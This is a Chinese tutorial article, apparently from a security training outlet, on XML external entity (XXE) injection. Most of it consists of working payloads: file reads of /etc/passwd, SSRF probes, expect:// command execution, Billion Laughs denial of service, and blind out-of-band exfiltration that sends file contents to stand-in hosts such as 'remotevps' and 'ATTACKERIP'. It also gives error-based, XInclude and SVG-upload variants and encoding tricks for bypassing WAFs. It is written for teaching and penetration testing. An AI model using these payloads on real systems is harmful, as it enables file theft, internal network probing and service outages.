\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/Kr2o-sSnAkSoyKRpjjK2yg)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

作者：掌控安全 - veek

一. XXE 基础

XXE(XML External Entity Injection) 全称为 XML 外部实体注入，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。

例如 PHP 中的 simplexml\_load 默认情况下会解析外部实体，有 XXE 漏洞的标志性函数为 simplexml\_load\_string()。而学习 XXE 要从认识 XML 开始。

### 二. XML 基础

XML 指可扩展标记语言（EXtensible Markup Language）  
XML 是一种标记语言，很类似 HTML  
XML 的设计宗旨是传输数据，而非显示数据  
XML 标签没有被预定义。您需要自行定义标签。  
XML 被设计为具有自我描述性。  
XML 是 W3C 的推荐标准

XML 是不作为的。

也许这有点难以理解，但是 XML 不会做任何事情。

XML 被设计用来结构化、存储以及传输信息。

下面是 John 写给 George 的便签，存储为 XML：

```
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

上面的这条便签具有自我描述性。

它拥有标题以及留言，同时包含了发送者和接受者的信息。

但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。

我们需要编写软件或者程序，才能传送、接收和显示出这个文档。

除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。

#### DTD

文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

内部的 DOCTYPE 声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：

```
<!DOCTYPE 根元素 \[元素声明\]>
```

外部文档声明

假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

DTD 的作用：

*   通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。
    
*   通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。
    
*   您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。
    
*   您还可以使用 DTD 来验证您自身的数据。
    

#### 实体

实体可以理解为变量，其必须在 DTD 中定义申明，可以在文档中的其他位置引用该变量的值。

##### 实体类别

实体按类型主要分为以下四种：

*   内置实体 (Built-in entities)
    
*   字符实体 (Character entities)
    
*   通用实体 (General entities)
    
*   参数实体 (Parameter entities)
    

实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。  
完整的实体类别可参考 DTD - Entities

参数实体用 % 实体名称申明，引用时也用 % 实体名称; 其余实体直接用实体名称申明，引用时用 & 实体名称。  
参数实体只能在 DTD 中申明，DTD 中引用；其余实体只能在 DTD 中申明，可在 xml 文档中引用。

内部实体：

```
<!ENTITY 实体名称 "实体的值">
```

外部实体:

```
<!ENTITY 实体名称 SYSTEM "URI">
```

参数实体：

```
<!ENTITY % 实体名称 "实体的值">
或者
<!ENTITY % 实体名称 SYSTEM "URI">
```

实例演示：除参数实体外实体 + 内部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a \[
    <!ENTITY name "nMask">\]>
<foo>
<value>&name;</value>
</foo>
```

实例演示：参数实体 + 外部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a \[
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
\]>
```

注意：%name（参数实体）是在 DTD 中被引用的，而 & name（其余实体）是在 xml 文档中被引用的。

由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

##### 外部实体

外部实体即在 DTD 中使用

```
<!ENTITY 实体名称 SYSTEM "URI">
```

语法引用外部的实体，而非内部实体，那么 URL 中能写哪些类型的外部实体呢？  
主要的有 file、http、https、ftp 等等，当然不同的程序支持的不一样：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISltia0ibaibZa3Ly0eR7wXd1loNLXkYcWwQl6EIXicg6W9QfcuUMox7lGYLQ/640?wx_fmt=png)

php 安装扩展后还能支持的一些协议：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlJaj0Gbbj7qLldLiaibXdnyDAz55PYJ4lYiaBOGiagEAxKqdk7QxEwKa38w/640?wx_fmt=png)

#### XML 外部实体注入

XML External Entity Injection 即 xml 外部实体注入漏洞，简称 XXE 漏洞。

XXE 是针对解析 XML 输入的应用程序的一种攻击。

当弱配置的 XML 解析器处理包含对外部实体的引用的 XML 输入时，就会发生此攻击。

这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。

### 三. XXE 检测

主要的方法是检测所有接受 XML 作为输入内容端点，抓包观察其是否会返回我们想要的内容。

如图，首先检测 XML 是否会被成功解析：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY \[
<!ENTITY words "Hello XXE !">\]>
<root>&words;</root>
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlJeWKX4Wc5ia40Ntic538Eic2hWH0YOwvicZxTiaLsg0MA6icBSl4TcwpdGkA/640?wx_fmt=png)

如果数据包或页面中存在 “Hello XXE” 的字样，则表名实体已被解析。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlgpwtlRewE4WxFfSKdsSeCS9LBm9ib3mEtbiadI4SElaibBbQDq8fgKw7Q/640?wx_fmt=png)

接下来检测该端点是否支持 DTD 引用外部实体：

```
<?xml version=”1.0” encoding=”UTF-8”?>
<!DOCTYPE ANY \[
<!ENTITY % name SYSTEM "http://localhost/tp5/test.xml">
%name;
\]>
```

此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求 test.xml 的 HTTP request。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlOmibaPdUFhnicat18KtdUwdcwymeFRicuAR0W0NWia9FHY5iaCTWeSKD22g/640?wx_fmt=png)

如图所示，则该处很可能存在 XML 外部实体注入漏洞。

另外，许多服务端开发框架 (比如基于 RESTful 服务的 JAX-RS) 也允许基于数据交换的 XML 格式作为输入，甚至是输出。

如果可以进行这种替换，可以通过修改请求头中的 Content-Type 的值 (比如修改成 text/xml 或者 application/xml) 来进行验证触发。

即使客户端只能使用 JSON 格式或者是直接路径或者是参数查询的方式来访问服务。

对于传统的 XXE 来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，

如果没有回显则可以使用 Blind XXE 漏洞来构建一条带外信道提取数据。

这块知识在下面的`XXE利用`中有详细介绍。

### 四. XXE 利用及 payload

以下利用主要基于`libxml2`版本，其中 libxml 是 PHP 的 xml 支持。  
而 libxml 版本在 2.9.1 及以后，默认不解析外部实体，很多利用将无法实现。

#### 文件读取

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe \[
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >\]>
<root>
<name>&xxe;</name>
</root>
```

文件读取的利用和 payload 非常好理解，即使用 file 协议读取文件内容，并输出到页面上（有回显的情况）。

#### SSRF

XXE 可以与 SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于 http 协议。

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo \[
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret\_pass.txt" >
\]>
<foo>&xxe;</foo>
```

当然也可以用来探测端口信息，根据响应包的信息，若非 “connection refused” 则表示该端口可能是开放的。

众所周知，有些企业对内网的安全性可能不那么注重。

除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用 ncat 工具进行测试。

关于 ncat 的使用：ncat - 网络工具中的‘瑞士军刀’

用 ncat 在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)

之后便可使用以下语句尝试是否能够建立连接：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://ATTACKERIP:8081/" \[
<!ELEMENT data (#PCDATA)>
\]>
<data>4</data>
```

如果能够建立连接，那么服务器端的 ncat 会收到相应的请求信息。

#### RCE

在安装 expect 扩展的 PHP 环境里执行系统命令，当然其他协议也有可能可以执行系统命令

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe \[
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" >\]>
<root>
<name>&xxe;</name>
</root>
```

#### DDoS

支持实体测试：

```
<!DOCTYPE data \[
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
\]>
<data>&a2;</data>
```

如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。

##### Billion Laughs 攻击

一个经典的 Dos 攻击 payload：

```
<?xml version="1.0"?><!DOCTYPE lolz \[ <!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
......
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
\]>
<lolz>&lol9;</lolz>
```

当 XML 解析器加载该文档时，它会看到它包含一个根元素 “lolz”，该元素包含文本 “&lol9;”。

然而，“&lol9;”是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。

每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到 10 个 “&lol7;” 字符串，以此类推。

在处理完所有的实体扩展之后，这个小 (小于 1 KB) 的 XML 块实际上将包含 109 = 10 亿个“lol”，占用了将近 3 gb 的内存。

#### Blind XXE

Blind XXE，字面意思也就是提交 xml 的服务器端点不再返回有效的数据，此时我们前面的一些利用方法就要失效了。但是解决方法还是有的。

##### XXE OOB(外带数据通道)

###### 概念

带外数据 (out—of—band data)，有时也称为加速数据 (expedited data)，  
是指连接双方中的一方发生重要事情，想要迅速地通知对方。

这种通知在已经排队等待发送的任何 “普通”(有时称为“带内”) 数据之前发送。

带外数据设计为比普通数据有更高的优先级。带外数据是映射到现有的连接中的，而不是在客户机和服务器间再用一个连接。

###### 利用

带外数据通道的建立是使用嵌套形式，利用外部实体中的 URL 发出访问，从而跟攻击者的服务器发生联系。

但有些情况下不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。

将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。

```
<?xml version="1.0"?>
<!DOCTYPE ANY\[
<!ENTITY % file SYSTEM "file:///C:/1.txt">
<!ENTITY % remote SYSTEM "http://remotevps/evil.xml">
%remote;
%all;
\]>
<root>&send;</root>
```

evil.xml：

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://remotevps/1.php?file=%file;'>">
```

实体 remote，all，send 的引用顺序很重要，首先对 remote 引用目的是将外部文件 evil.xml 引入到解释上下文中，然后执行 %all，这时会检测到 send 实体，在 root 节点中引用 send，就可以成功实现数据转发。当请求发送以后，攻击者的服务器上就能查看到`1.txt`中的内容。

##### 基于错误的 XXE

形同 blind xxe，当我们成功地让服务端解析了 xml 文档，得到的响应却是通用的。比如添加账号的时候只返回 “添加成功” 这样的响应。此时我们可以让服务器响应报错信息来得到我们要的敏感数据。

有两种报错的来源：

*   DTD 结构的错误
    
*   XML 架构验证时的错误
    

外部 DTD

在本例中，我们将让服务器加载一个恶意 DTD，它将在错误消息中显示文件的内容 (只有当可以看到错误消息时，这才有效)。

可以使用恶意的外部 DTD 触发包含 / etc/passwd 文件内容的 XML 解析错误消息，如下所示:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

这个 DTD 执行以下步骤:

定义一个名为 file 的 XML 参数实体，其中包含 / etc/passwd 文件的内容。

定义一个名为 eval 的 XML 参数实体，包含另一个名为 error 的 XML 参数实体的动态声明。错误实体将通过加载一个不存在的文件来评估，该文件的名称包含文件实体的值。

使用 eval 实体，该实体将导致执行错误实体的动态声明。

使用错误实体，以便通过尝试加载不存在的文件来得到数据，从而导致返回包含不存在文件的名称的错误消息，该名称正是 / etc/passwd 文件的内容。

实例演示：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlLuicK6r45BiaFibovA1Q5wPlibkxOvzI3TlxfnaZW04JMQ5icm0TtHicQvLw/640?wx_fmt=png)

请注意，外部 DTD 允许我们在第二个 (eval) 中包含一个实体，但在内部 DTD 中是禁止的。因此，在不允许使用外部 DTD 的情况下 (通常) 强制执行错误是行不通的。

内外部 DTD 混合

那么，当带外交互被阻止 (外部连接不可用) 时， blind XXE 漏洞怎么办?

在这种情况下，由于 XML 语言规范中的漏洞，仍然有可能触发包含敏感数据的错误消息。

如果文档的 DTD 混合使用内部和外部 DTD 声明，那么内部 DTD 可以重新定义在外部 DTD 中声明的实体。

当发生这种情况时，在另一个参数实体的定义中使用 XML 参数实体的限制就放宽了。

这意味着攻击者可以从内部 DTD 中使用基于错误的 XXE 技术，前提是他们使用的 XML 参数实体是重新定义在外部 DTD 中声明的实体。

当然，如果带外连接被阻塞，那么就不能从远程位置加载外部 DTD。

相反，它需要是应用服务器本地的外部 DTD 文件。

从本质上说，攻击涉及调用碰巧存在于本地文件系统上的 DTD 文件，并将其重新用于重定义现有实体，从而触发包含敏感数据的解析错误。

例如，假设服务器文件系统上位于位置 / usr/local/app/schema. 上有一个 DTD 文件这个 dtd 文件定义了一个名为 custom\_entity 的实体。

攻击者可以通过提交如下混合 DTD 来触发包含 / etc/passwd 文件内容的 XML 解析错误消息:

```
<!DOCTYPE foo \[
    <!ENTITY % local\_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom\_entity '
        <!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
    '>
    %local\_dtd;
\]>
```

这个 DTD 执行以下步骤:  
定义名为 local\_dtd 的 XML 参数实体，其中包含存在于服务器文件系统上的外部 DTD 文件的内容。  
重新定义名为 custom\_entity 的 XML 参数实体，该实体已经在外部 DTD 文件中定义。

实体被重新定义为包含前面描述的基于错误的 XXE 漏洞，用于触发包含 / etc/passwd 文件内容的错误消息。  
使用 local\_dtd 实体，以便解释外部 DTD，包括重新定义的 custom\_entity 实体的值。这将导致所需的错误消息。  
现实世界的例子: 使用 GNOME 桌面环境的系统通常有一个 DTD 在 / usr/share/yelp/ DTD /docbookx 包含名为 ISOamso 的实体的 dtd。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISl7MyB4k1VAuHibzSUPQ2g89pMfwq3EH6hsQFKRia8DlkxmqHYC54MRM6g/640?wx_fmt=png)

由于该技术使用内部 DTD，所以首先需要找到一个有效的 DTD。

你可以安装相同的服务器正在使用的操作系统 / 软件和搜索一些默认 dtd，或抓取系统内的默认 dtd 列表，并检查其中是否存在。

```
<!DOCTYPE foo \[
<!ENTITY % local\_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local\_dtd;
\]>
```

#### XInclude 攻击

什么是 XInclude？顾名思义，xinclude 可以理解为 xml include

熟悉编译 / 脚本语言的一定熟知，像 php 的 include，python 和 java 的 import 都是可以进行文件包含的。

**那么文件包含有什么好处？**

当然是可以使代码更整洁，我们可以将定义的功能函数放在 function.php 中，再在需要使用功能函数的文件中使用 include 包含 function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性。

故此，xinclude 也不例外，它是 xml 标记语言中包含其他文件的方式。

一些应用程序接收客户端提交的数据，会将其嵌入到服务器端 XML 文档中，然后解析文档。

当客户端提交的数据被放置到后端 SOAP(简单对象访问协议) 请求中，然后由后端 SOAP 服务处理时，就会出现这种情况。

在这种情况下，我们不能执行典型的 XXE 攻击，因为无法控制整个 XML 文档，因此不能定义或修改 DOCTYPE 元素。但是，我们可以使用 XInclude 代替。

XInclude 是 XML 规范的一部分，它允许从子文档构建 XML 文档。

我们可以在 XML 文档中的任何数据值中放置 XInclude 攻击，因此可以在只控制放在服务器端 XML 文档中的单个数据项的情况下执行攻击。

要执行 XInclude 攻击，需要引用 XInclude 名称空间并提供希望包含的文件的路径。

例如:

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

详细的利用请参考: 浅析 xml 之 xinclude & xslt

#### XSTL 攻击

XSLT（扩展样式表转换语言）是一种对 XML 文档进行转化的语言。XML 文档通过 XSLT 转化后可以变成为另一份不同的 XML 文档，或者其他类型的文档，例如 HTML 文档、 CSV 文件、纯文本文件等。

有关具体的转化过程，请参考：sourse

因为同样具有 XML 文档，那也有 XXE 的漏洞隐患。关于具体的应用，可参考优秀翻译文章：sourse

### 五. XXE Bypass

上传文件绕过

有些应用程序允许用户上传文件，然后在服务器端处理这些文件。

一些常见的文件格式使用 XML 或包含 XML 子组件。

基于 xml 的格式包括 DOCX 这样的办公文档格式和 SVG 这样的图像格式。

例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。

即使应用程序希望接收 PNG 或 JPEG 之类的格式，所使用的图像处理库也可能支持 SVG 图像。

由于 SVG 格式使用 XML，攻击者可以提交恶意的 SVG 图像，从而达到针对 XXE 漏洞的隐藏攻击面。

```
<svgxmlns="http://www.w3.org/2000/svg"xmlns:xlink="http://www.w3.org/1999/xlink"width="300"version="1.1"height="200"><imagexlink:href="file:///etc/hostname"></image></svg>
```

另外，许多常见的文档格式，例如 doc，docx，odt 等，其实质是一个 zip 文件，其中包含 xml 文件。

当我们用 winrar、7z 等工具打开这类文件就能看到：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlicLoFVjSWp1Iw05w5ccs5QXZTnXFrTxia8Ysvib2weaNU8Te8YZbxYwgg/640?wx_fmt=png)

我们可以利用这些文件来绕过 xxe 防御。 

oxml\_xxe 就是一个用于向此类文件中嵌入 XXE Payload 的工具。

它支持以下文件格式的创建或修改：

*   DOCX/XLSX/PPTX
    
*   ODT/ODG/ODP/ODS
    
*   SVG
    
*   XML
    
*   PDF (experimental)
    
*   JPG (experimental)
    
*   GIF (experimental)
    

oxml\_xxe 的工作原理分为两种：

*   一是直接建立一个文件，该模式会自动添加 DOCTYPE 并将 XML 实体插入到用户选择的文件中。
    
*   二是替换文件中的字符串，此模式会遍历查找文档中的符号 §。并用 XML 实体 (“&xxe;”) 替换此符号的所有实例。注意，你可以在任何地方打开文档并插入 § 来替换它。
    
    常见的用例是 web 应用程序，它读取 xlsx，然后将结果打印到屏幕上。利用 XXE 我们便可以将内容打印到屏幕上。
    

#### 编码绕过

##### base64

```
<!DOCTYPE test \[ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; \]><foo/>
```

仅当 XML 服务器接受 data:// 协议时，此方法才有效。

##### utf-7

直接上样例：

```
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

##### 使用两种编码

思路是在同一个文档里同时使用两种编码，从而迷惑 WAF。直接用生成的命令来说明：

```
echo -n '<?xml version="1.0" encoding="UTF-16BE"?>'> payload.xml
echo '<a>1337</a>'| iconv -f UTF-8-t UTF-16BE>> payload.xml
```

头部声明使用 UTF-8 编码，而之后使用 UTF-16 编码。当解析器读到 XML 声明的编码时，会切换到该编码（继续解析），即使该编码与声明部分所使用的编码不同。

与此同时，WAF 一般不支持这种多种编码的 XML 文档。

##### 在实体内编码

是新的 XML 技术，对内部实体中的任何 DTD/XML 进行编码（编码格式是字符串 16 进制 + UTF-8 形式），达到 WAF bypass 的效果！  
当没有 XXE，但 XML 主体中存在漏洞 (例如 SQL 注入) 时起作用。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq3D6frZ7ibtepGt4OHxwISlyUkFFdnWu66pKjyOIFXjR70picOkmaW63zcLCE0ezuakqDbKowP3IEw/640?wx_fmt=png)

#### 文档中的额外空格

由于 XXE 通常在 XML 文档的开头，所以比较省事儿的 WAF 可以避免处理整个文档，而只解析它的开头。但是，XML 格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在`<?xml?>`或`<!DOCTYPE>`中插入额外的空格，从而绕过此类 WAF。

### 六. XXE 工具

#### XXEinjector

XXEinjector 是一个使用 Ruby 编写的自动化 xxe 漏洞检测工具，可以通过给定一个 http 请求的包，然后设置好好参数就会自动化的进行 fuzz，他会通过内置的规则进行自动化的测试，并且还支持二次注入（通过另一个请求触发漏洞）。

### 七. 参考资料

未知攻焉知防——XXE 漏洞攻防

https://phonexicum.github.io/infosec/xxe.html#xxe-targets

https://github.com/enjoiz/XXEinjector

PayloadsAllTheThings/XXE Injection at master

【译】黑夜的猎杀 - 盲打 XXE - 先知社区

浅析 xml 之 xinclude & xslt – CoLaBug.com

XML External Entity - HackTricks

  

**回顾往期内容**

[一起来学 PHP 代码审计（一）入门](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487858&idx=1&sn=47c58061798afda9f50d6a3b838f184e&chksm=fa686803cd1fe115a3af2e3b1e42717dcc6d8751c888d686389f6909695b0ae0e1f4d58e24b3&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[新时代的渗透思路！微服务下的信息搜集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487493&idx=1&sn=9ca65b3b6098dfa4d53a0d60be4bee51&chksm=fa686974cd1fe062500e5afb03a0181a1d731819f7535c36b61c05b3c6144807e0a76a0130c5&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**